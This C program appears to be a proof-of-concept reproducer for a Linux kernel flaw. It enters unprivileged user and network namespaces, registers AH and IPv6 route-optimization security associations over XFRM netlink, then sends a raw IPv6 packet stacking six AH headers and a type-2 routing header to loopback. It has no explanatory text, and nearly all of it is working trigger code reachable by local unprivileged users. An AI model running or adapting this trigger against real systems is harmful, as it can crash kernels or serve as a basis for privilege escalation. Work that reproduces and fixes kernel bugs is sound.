// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/ipv6.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/ioctl.h>

#ifndef IPPROTO_AH
#define IPPROTO_AH 51
#endif
#ifndef IPPROTO_ROUTING
#define IPPROTO_ROUTING 43
#endif
#ifndef IPPROTO_NONE
#define IPPROTO_NONE 59
#endif
#ifndef IPV6_SRCRT_TYPE_2
#define IPV6_SRCRT_TYPE_2 2
#endif

static const uint8_t RT2_HOME_ADDR[16] = {
	0x20, 0x01, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x42
};
static const uint8_t LOOPBACK_ADDR[16] = {
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
};

static void die(const char *m)
{
	perror(m);
	exit(1);
}

static int nl_open(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd < 0) die("socket NETLINK_XFRM");
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("bind");
	return fd;
}

struct nlbuf {
	uint8_t buf[8192];
	struct nlmsghdr *nlh;
};

static void nl_init(struct nlbuf *b, int type, int flags)
{
	memset(b->buf, 0, sizeof(b->buf));
	b->nlh = (struct nlmsghdr *)b->buf;
	b->nlh->nlmsg_len = NLMSG_HDRLEN;
	b->nlh->nlmsg_type = type;
	b->nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
	b->nlh->nlmsg_seq = 1;
	b->nlh->nlmsg_pid = 0;
}

static void *nl_payload(struct nlbuf *b, size_t len)
{
	void *p = (uint8_t *)b->nlh + b->nlh->nlmsg_len;
	b->nlh->nlmsg_len += NLMSG_ALIGN(len);
	return p;
}

static void nl_addattr(struct nlbuf *b, int type, const void *data, size_t len)
{
	struct nlattr *attr = (struct nlattr *)((uint8_t *)b->nlh + NLMSG_ALIGN(b->nlh->nlmsg_len));
	attr->nla_type = type;
	attr->nla_len = NLA_HDRLEN + len;
	memcpy((uint8_t *)attr + NLA_HDRLEN, data, len);
	b->nlh->nlmsg_len = NLMSG_ALIGN(b->nlh->nlmsg_len) + NLA_ALIGN(NLA_HDRLEN + len);
}

static int nl_send(int fd, struct nlbuf *b)
{
	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
	if (sendto(fd, b->nlh, b->nlh->nlmsg_len, 0,
		   (struct sockaddr *)&dst, sizeof(dst)) < 0)
		return -1;

	uint8_t resp[4096];
	int n = recv(fd, resp, sizeof(resp), 0);
	if (n < 0) return -1;
	struct nlmsghdr *r = (struct nlmsghdr *)resp;
	if (r->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(r);
		if (e->error != 0) {
			fprintf(stderr, "netlink error %d (%s)\n", e->error, strerror(-e->error));
			errno = -e->error;
			return -1;
		}
	}
	return 0;
}

static int add_ah_sa(int fd, uint32_t spi)
{
	struct nlbuf b;
	nl_init(&b, XFRM_MSG_NEWSA, NLM_F_CREATE | NLM_F_EXCL);

	struct xfrm_usersa_info *sa = nl_payload(&b, sizeof(*sa));
	memset(sa, 0, sizeof(*sa));
	memcpy(&sa->id.daddr, LOOPBACK_ADDR, 16);
	sa->id.spi = htonl(spi);
	sa->id.proto = IPPROTO_AH;
	memcpy(&sa->saddr, LOOPBACK_ADDR, 16);
	sa->lft.soft_byte_limit = (uint64_t)-1;
	sa->lft.hard_byte_limit = (uint64_t)-1;
	sa->lft.soft_packet_limit = (uint64_t)-1;
	sa->lft.hard_packet_limit = (uint64_t)-1;
	sa->reqid = spi;
	sa->family = AF_INET6;
	sa->mode = XFRM_MODE_TRANSPORT;
	sa->replay_window = 0;
	sa->flags = 0;

	sa->sel.family = AF_INET6;
	sa->sel.prefixlen_d = 0;
	sa->sel.prefixlen_s = 0;

	struct xfrm_algo_auth auth;
	memset(&auth, 0, sizeof(auth));
	strcpy(auth.alg_name, "digest_null");
	auth.alg_key_len = 0;
	auth.alg_trunc_len = 0;
	nl_addattr(&b, XFRMA_ALG_AUTH_TRUNC, &auth, sizeof(auth));

	if (nl_send(fd, &b) < 0) {
		fprintf(stderr, "add_ah_sa(spi=%u) failed\n", spi);
		return -1;
	}
	printf("[+] added AH SA spi=%u\n", spi);
	return 0;
}

static int add_rt2_sa(int fd)
{
	struct nlbuf b;
	nl_init(&b, XFRM_MSG_NEWSA, NLM_F_CREATE | NLM_F_EXCL);

	struct xfrm_usersa_info *sa = nl_payload(&b, sizeof(*sa));
	memset(sa, 0, sizeof(*sa));

	memcpy(&sa->id.daddr, RT2_HOME_ADDR, 16);
	sa->id.spi = 0;
	sa->id.proto = IPPROTO_ROUTING;
	memcpy(&sa->saddr, LOOPBACK_ADDR, 16);
	sa->lft.soft_byte_limit = (uint64_t)-1;
	sa->lft.hard_byte_limit = (uint64_t)-1;
	sa->lft.soft_packet_limit = (uint64_t)-1;
	sa->lft.hard_packet_limit = (uint64_t)-1;
	sa->reqid = 0x200;
	sa->family = AF_INET6;
	sa->mode = XFRM_MODE_ROUTEOPTIMIZATION;
	sa->replay_window = 0;
	sa->flags = 0;

	sa->sel.family = AF_INET6;
	sa->sel.prefixlen_d = 0;
	sa->sel.prefixlen_s = 0;

	xfrm_address_t coaddr;
	memset(&coaddr, 0, sizeof(coaddr));
	nl_addattr(&b, XFRMA_COADDR, &coaddr, sizeof(coaddr));

	if (nl_send(fd, &b) < 0) {
		fprintf(stderr, "add_rt2_sa failed\n");
		return -1;
	}
	printf("[+] added RT2 SA (proto=ROUTING, mode=ROUTEOPTIMIZATION)\n");
	return 0;
}

static int set_lo_up(void)
{
	int s = socket(AF_INET6, SOCK_DGRAM, 0);
	if (s < 0) die("socket AF_INET6");
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { close(s); return -1; }
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { close(s); return -1; }
	close(s);
	return 0;
}

struct ah_hdr_pad {
	uint8_t nexthdr;
	uint8_t hdrlen;
	uint16_t reserved;
	uint32_t spi;
	uint32_t seq;
	uint8_t icv_pad[4];
} __attribute__((packed));

static void send_packet(void)
{
	int s = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (s < 0) die("socket SOCK_RAW IPPROTO_RAW");

	int hdrincl = 1;
	(void)setsockopt(s, IPPROTO_IPV6, IPV6_HDRINCL, &hdrincl, sizeof(hdrincl));

	uint8_t pkt[2048];
	memset(pkt, 0, sizeof(pkt));

	struct ip6_hdr *ip6 = (struct ip6_hdr *)pkt;
	ip6->ip6_flow = htonl(6 << 28);
	ip6->ip6_nxt = IPPROTO_AH;
	ip6->ip6_hlim = 64;
	memcpy(&ip6->ip6_src, LOOPBACK_ADDR, 16);
	memcpy(&ip6->ip6_dst, LOOPBACK_ADDR, 16);

	uint8_t *p = pkt + sizeof(struct ip6_hdr);

	for (int i = 1; i <= 6; i++) {
		struct ah_hdr_pad *ah = (struct ah_hdr_pad *)p;
		ah->nexthdr = (i == 6) ? IPPROTO_ROUTING : IPPROTO_AH;
		ah->hdrlen = 2;
		ah->reserved = 0;
		ah->spi = htonl(i);
		ah->seq = htonl(0);
		memset(ah->icv_pad, 0, 4);
		p += sizeof(*ah);
	}

	uint8_t *rt = p;
	rt[0] = IPPROTO_NONE;
	rt[1] = 2;
	rt[2] = IPV6_SRCRT_TYPE_2;
	rt[3] = 1;
	rt[4] = rt[5] = rt[6] = rt[7] = 0;
	memcpy(&rt[8], RT2_HOME_ADDR, 16);
	p += 24;

	size_t payload_len = (size_t)(p - (pkt + sizeof(struct ip6_hdr)));
	ip6->ip6_plen = htons(payload_len);

	struct sockaddr_in6 dst;
	memset(&dst, 0, sizeof(dst));
	dst.sin6_family = AF_INET6;
	memcpy(&dst.sin6_addr, LOOPBACK_ADDR, 16);

	size_t total = sizeof(struct ip6_hdr) + payload_len;
	printf("[*] sending %zu byte packet (payload=%zu) ...\n", total, payload_len);
	if (sendto(s, pkt, total, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		perror("sendto");
	close(s);
}

int main(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
		die("unshare(CLONE_NEWUSER|CLONE_NEWNET)");

	int f;
	char buf[64];
	f = open("/proc/self/setgroups", O_WRONLY);
	if (f >= 0) { (void)write(f, "deny", 4); close(f); }
	f = open("/proc/self/uid_map", O_WRONLY);
	if (f >= 0) {
		int n = snprintf(buf, sizeof(buf), "0 %d 1\n", uid);
		(void)write(f, buf, n); close(f);
	}
	f = open("/proc/self/gid_map", O_WRONLY);
	if (f >= 0) {
		int n = snprintf(buf, sizeof(buf), "0 %d 1\n", gid);
		(void)write(f, buf, n); close(f);
	}

	if (set_lo_up() < 0) die("set_lo_up");

	int xfrmfd = nl_open();
	for (int i = 1; i <= 6; i++) {
		if (add_ah_sa(xfrmfd, i) < 0) {
			fprintf(stderr, "[-] AH SA add failed at %d\n", i);
			return 1;
		}
	}
	if (add_rt2_sa(xfrmfd) < 0) {
		fprintf(stderr, "[-] RT2 SA add failed\n");
		return 1;
	}
	close(xfrmfd);

	send_packet();

	usleep(200000);
	printf("[*] done\n");
	return 0;
}
